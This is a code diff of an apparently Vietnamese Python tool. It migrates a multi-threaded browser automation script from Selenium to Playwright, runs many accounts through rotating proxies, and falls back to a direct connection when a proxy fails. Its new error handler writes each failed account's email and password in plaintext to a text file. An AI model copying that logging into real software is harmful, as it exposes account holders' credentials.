         # Setup account queue
         account_queue = Queue()
         screen_width, screen_height = pyautogui.size()
@@ -663,57 +783,70 @@ def main():
         signal.signal(signal.SIGINT, signal_handler)
         signal.signal(signal.SIGTERM, signal_handler)
         
-        driver_init_lock = threading.Lock()
+        browser_init_lock = threading.Lock()
         
         def worker():
             """Hàm worker thread"""
-            driver = None
+            browser = None
             while not account_queue.empty():
                 try:
                     account, account_index = account_queue.get()
-                    with driver_init_lock:
+                    with browser_init_lock:
                         proxy = proxies[account_index % len(proxies)] if len(proxies) > 0 else None
-                        row = account_index // col
-                        col_index = account_index % col
                         size = (screen_width // col, 400)
-                        if proxy: 
-                            with MitmproxyManager(f'{proxy["host_port"]}:{proxy["credentials"]}') as local_proxy:
-                                driver, user_data_dir = init_driver(
-                                    proxy=local_proxy, 
-                                    email=account['email'], 
-                                    row=row, 
-                                    col=col_index, 
+                        
+                        # Debug logging for proxy
+                        if proxy:
+                            logging.debug(f"Using proxy for {account['email']}: {proxy}")
+                            # # Test proxy connection
+                            # if proxy.get('username') and proxy.get('password'):
+                            #     if not test_proxy_connection(proxy):
+                            #         logging.warning(f"Proxy test failed for {proxy['full']}, trying without proxy...")
+                            #         proxy = None  # Fallback to no proxy
+                        
+                        # Try to initialize browser with proxy, fallback to no proxy if it fails
+                        browser_initialized = False
+                        for use_proxy in [True, False]:
+                            if not use_proxy and proxy is None:
+                                continue  # Skip if we already tried without proxy
+                                
+                            current_proxy = proxy if use_proxy else None
+                            try:
+                                browser, context, page, user_data_dir, playwright = init_browser(
+                                    proxy=current_proxy, 
+                                    email=account['email'],  
                                     size=size
                                 )
-                                drivers.append(driver)
-                                process_account(driver, user_data_dir, account, account_index)
-                        else:
-                            driver, user_data_dir = init_driver(
-                                    proxy=None, 
-                                    email=account['email'], 
-                                    row=row, 
-                                    col=col_index, 
-                                    size=size
-                                )
-                            drivers.append(driver)
-                            process_account(driver, user_data_dir, account, account_index)
+                                browsers.append(browser)
+                                browser_initialized = True
+                                if not use_proxy:
+                                    logging.warning(f"Fallback to no proxy for {account['email']}")
+                                break
+                            except Exception as e:
+                                logging.warning(f"Failed to initialize browser with{'out' if not use_proxy else ''} proxy for {account['email']}: {repr(e)}")
+                                if browser:
+                                    try:
+                                        browser.close()
+                                    except:
+                                        pass
+                                    browser = None
+                                
+                        if not browser_initialized:
+                            raise Exception("Failed to initialize browser with and without proxy")
+                    
+                    process_account(browser, context, page, user_data_dir, playwright, account, account_index)
 
                 except Exception as e:
                     logging.error(f"Lỗi trong worker thread: {repr(e)}")
+                    # Log the account as failed
+                    with file_lock:
+                        failed_accounts.append({'account': account, 'error': repr(e)})
+                        with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
+                            f.write(f"{account['email']}|{account['password']}|{repr(e)}\n")
                 
                 finally:
-                    if driver:
-                        try:
-                            driver.close()
-                            driver.quit()
-                            if hasattr(driver, "service") and hasattr(driver.service, "process") and driver.service.process:
-                                kill_child_processes(driver.service.process.pid)
-                        except Exception as e:
-                            logging.warning(f"Lỗi khi dọn dẹp driver: {e}")
-                        finally:
-                            if driver in drivers:
-                                drivers.remove(driver)
-                    
+                    if browser and browser in browsers:
+                        browsers.remove(browser)
                     account_queue.task_done()
         
         # Start worker threads
@@ -739,17 +872,17 @@ def main():
     except Exception as e:
         logging.error(f"Lỗi trong hàm main: {repr(e)}")
     finally:
-        cleanup_drivers()
+        cleanup_browsers()
 
 if __name__ == "__main__":
     try:
-        signal.signal(signal.SIGTERM, cleanup_drivers)
-        signal.signal(signal.SIGINT, cleanup_drivers)
-        atexit.register(cleanup_drivers)
+        signal.signal(signal.SIGTERM, cleanup_browsers)
+        signal.signal(signal.SIGINT, cleanup_browsers)
+        atexit.register(cleanup_browsers)
         main()
     except KeyboardInterrupt:
         logging.info("Nhận KeyboardInterrupt. Đang dọn dẹp...")
-        cleanup_drivers()
+        cleanup_browsers()
         clean_all_user_data()
         logging.info("Dọn dẹp hoàn tất. Thoát...")
         sys.exit(0)
